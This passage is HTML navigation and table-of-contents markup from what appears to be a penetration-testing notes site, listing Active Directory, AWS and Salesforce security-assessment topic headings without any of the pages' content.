    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/Golden%20Ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Golden Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NoPac (SamAccountName Spoofing)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/Silver%20Ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Silver Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_1_7" >
        
          
          <label class="md-nav__link" for="__nav_3_6_1_7" id="__nav_3_6_1_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ADCS
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_6_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_1_7">
            <span class="md-nav__icon md-icon"></span>
            ADCS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/ESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Enumerate ADCS
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_1_8" >
        
          
          <label class="md-nav__link" for="__nav_3_6_1_8" id="__nav_3_6_1_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    SCCM
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_6_1_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_1_8">
            <span class="md-nav__icon md-icon"></span>
            SCCM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SCCM Site Takeover I
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20II/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SCCM Site Takeover II
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_2" >
        
          
          <label class="md-nav__link" for="__nav_3_6_2" id="__nav_3_6_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Local
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_2">
            <span class="md-nav__icon md-icon"></span>
            Local
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/Local%20Administrator%20Password%20Solution/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Local Administrator Password Solution
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Token Privileges
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/UAC%20Bypasses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    UAC Bypasses
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/Unquoted%20Service%20Path/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Unquoted Service Path
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/Weak%20Service%20Binary%20Permissions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Weak Service Binary Permissions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Local/Weak%20Service%20Permissions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Weak Service Permissions
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
        
          
          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    6. Defense Evasion
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_7">
            <span class="md-nav__icon md-icon"></span>
            6. Defense Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/6.%20Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Powershell Downgrade
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
        
          
          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Miscellaneous
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_8">
            <span class="md-nav__icon md-icon"></span>
            Miscellaneous
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Disable Restricted Admin Mode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Enable plaintext wdigest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/Miscellaneous/Host%20Persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Host Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cloud
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Amazon Web Services (AWS)
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Amazon Web Services (AWS)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Authenticate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Compute Services & Lateral Movement
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Credential & Identity Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Discovery & Reconnaissance
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Phishing via SSO Device Codes
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Secrets & Notification Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Serverless Services Exploitation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Storage Enumeration & Exploitation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tools
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Methodologies
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Methodologies
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    âœ… Checklists
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            âœ… Checklists
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E2%9C%85%20Checklists/Active%20Directory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Application
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" checked>
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ðŸ˜ Cheatsheets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            ðŸ˜ Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Compiling%20Binaries/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Compiling Binaries
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Misc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Misc
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Passive%20Network%20Recon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Passive Network Recon
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PowerView/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PowerView
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SQLMap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQLMap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_7" checked>
        
          
          <label class="md-nav__link" for="__nav_5_2_7" id="__nav_5_2_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    DaForce
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_7_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5_2_7">
            <span class="md-nav__icon md-icon"></span>
            DaForce
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Salesforce   1
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Salesforce   1
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#table-of-contents" class="md-nav__link">
    <span class="md-ellipsis">
      Table of Contents
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pre-engagement-setup" class="md-nav__link">
    <span class="md-ellipsis">
      Pre-Engagement Setup
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pre-Engagement Setup">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#essential-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Essential Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-access-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access Validation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-intelligence-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance &amp; Intelligence Gathering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance &amp; Intelligence Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-salesforce-instance-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      1. Salesforce Instance Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-organization-metadata-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      2. Organization Metadata Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-user-role-intelligence" class="md-nav__link">
    <span class="md-ellipsis">
      3. User &amp; Role Intelligence
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-custom-code-object-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      4. Custom Code &amp; Object Discovery
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authentication-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Authentication Security Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Authentication Security Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-password-policy-evaluation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Password Policy Evaluation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-multi-factor-authentication-mfa-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Multi-Factor Authentication (MFA) Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-session-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      3. Session Security Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-single-sign-on-sso-security" class="md-nav__link">
    <span class="md-ellipsis">
      4. Single Sign-On (SSO) Security
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authorization-access-control-testing" class="md-nav__link">
    <span class="md-ellipsis">
      Authorization &amp; Access Control Testing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Authorization &amp; Access Control Testing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-profile-permission-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      1. Profile &amp; Permission Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-field-level-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Field-Level Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-record-level-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      3. Record-Level Security Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-guest-user-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      4. Guest User Security Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-security-evaluation" class="md-nav__link">
    <span class="md-ellipsis">
      Data Security Evaluation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Data Security Evaluation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-sensitive-data-discovery-classification" class="md-nav__link">
    <span class="md-ellipsis">
      1. Sensitive Data Discovery &amp; Classification
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-data-export-exfiltration-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Data Export &amp; Exfiltration Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-encryption-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      3. Encryption Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#custom-code-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Custom Code Security Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Custom Code Security Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-soqlsosl-injection-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      1. SOQL/SOSL Injection Vulnerabilities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-authorization-bypass-in-apex" class="md-nav__link">
    <span class="md-ellipsis">
      2. Authorization Bypass in Apex
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-visualforce-security-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      3. Visualforce Security Vulnerabilities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-lightning-component-security" class="md-nav__link">
    <span class="md-ellipsis">
      4. Lightning Component Security
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#platform-configuration-security" class="md-nav__link">
    <span class="md-ellipsis">
      Platform Configuration Security
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Platform Configuration Security">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-critical-security-settings-audit" class="md-nav__link">
    <span class="md-ellipsis">
      1. Critical Security Settings Audit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-api-security-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      2. API Security Configuration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-data-loss-prevention-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      3. Data Loss Prevention Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#api-security-testing" class="md-nav__link">
    <span class="md-ellipsis">
      API Security Testing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="API Security Testing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-rest-api-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      1. REST API Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-bulk-api-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Bulk API Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-soap-api-security-testing" class="md-nav__link">
    <span class="md-ellipsis">
      3. SOAP API Security Testing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#integration-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Integration Security Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Integration Security Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-connected-apps-security-review" class="md-nav__link">
    <span class="md-ellipsis">
      1. Connected Apps Security Review
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-named-credentials-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Named Credentials Security Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#advanced-attack-vectors" class="md-nav__link">
    <span class="md-ellipsis">
      Advanced Attack Vectors
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Advanced Attack Vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-formula-injection-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      1. Formula Injection Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-process-automation-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      2. Process Automation Exploitation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-metadata-api-security-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      3. Metadata API Security Exploitation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation-persistence" class="md-nav__link">
    <span class="md-ellipsis">
      Post-Exploitation &amp; Persistence
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post-Exploitation &amp; Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-data-exfiltration-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      1. Data Exfiltration Techniques
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-persistence-mechanisms" class="md-nav__link">
    <span class="md-ellipsis">
      2. Persistence Mechanisms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      3. Lateral Movement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detection-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Detection Evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Detection Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-audit-trail-manipulation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Audit Trail Manipulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-legitimate-tool-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      2. Legitimate Tool Abuse
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reporting-evidence-collection" class="md-nav__link">
    <span class="md-ellipsis">
      Reporting &amp; Evidence Collection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reporting &amp; Evidence Collection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-critical-findings-documentation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Critical Findings Documentation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-compliance-mapping" class="md-nav__link">
    <span class="md-ellipsis">
      2. Compliance Mapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-risk-assessment-matrix" class="md-nav__link">
    <span class="md-ellipsis">
      3. Risk Assessment Matrix
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remediation-hardening-recommendations" class="md-nav__link">
    <span class="md-ellipsis">
      Remediation &amp; Hardening Recommendations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remediation &amp; Hardening Recommendations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-immediate-security-controls" class="md-nav__link">
    <span class="md-ellipsis">
      1. Immediate Security Controls
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-short-term-security-improvements-1-2-weeks" class="md-nav__link">
    <span class="md-ellipsis">
      2. Short-Term Security Improvements (1-2 weeks)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-long-term-security-strategy-1-3-months" class="md-nav__link">
    <span class="md-ellipsis">
      3. Long-Term Security Strategy (1-3 months)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
